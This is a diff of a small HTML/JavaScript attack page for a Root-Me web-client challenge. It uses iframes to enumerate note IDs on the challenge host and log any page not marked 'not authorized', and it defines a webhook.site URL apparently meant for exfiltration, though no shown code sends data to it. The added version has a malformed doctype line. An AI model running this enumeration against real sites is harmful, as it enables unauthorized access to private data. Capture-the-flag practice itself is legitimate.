@@ -1,52 +1,53 @@
-<script>
-const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
-const WEBHOOK = "https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864";
+!DOCTYPE html>
 
-function tryId(start = 2800, max = 3000) {
-    let i = start;
+<html>
 
-    function next() {
-        if (i > max) return;
+<head>
 
-        const iframe = document.createElement("iframe");
+</head>
 
-        const currentId = i;
+<body>
 
-       iframe.onload = () => {
-        console.log("LOADED", currentId);
-        
-        try {
-            const doc = iframe.contentDocument;
-        
-            if (!doc || !doc.body) {
-                console.log("no body", currentId);
-            } else {
-                const text = doc.body.textContent.trim();
-                console.log(currentId, JSON.stringify(text));
-        
-                if (!text.includes("not authorized")) {
-                    console.log("FOUND", currentId);
-                }
-            }
-        } catch (e) {
-            console.log("ACCESS ERROR", currentId);
-        }
-        
-        iframe.remove();
-        i++;
-        setTimeout(next, 100);
+    <div id="status"></div>
+
+    <script>
+
+    const TARGET = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/';
+
+    const WEBHOOK = 'https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864';
+
+function tryId(i) {
+
+    const iframe = document.createElement("iframe");
+
+
+
+    iframe.onload = () => {
+
+        console.log("loaded:", i);
+
     };
 
 
-        iframe.src = TARGET + currentId;
 
-        const container = document.body || document.documentElement;
-        container.appendChild(iframe);
-    }
+    iframe.onerror = () => {
 
-    next();
+        console.log("error:", i);
+
+    };
+
+
+
+    iframe.src = TARGET + i;
+
+    document.body.appendChild(iframe);
+
 }
 
 
-tryId();
-</script>
+tryId(2811);
+tryId(2810);
+    </script>
+</body>
+
+</html>
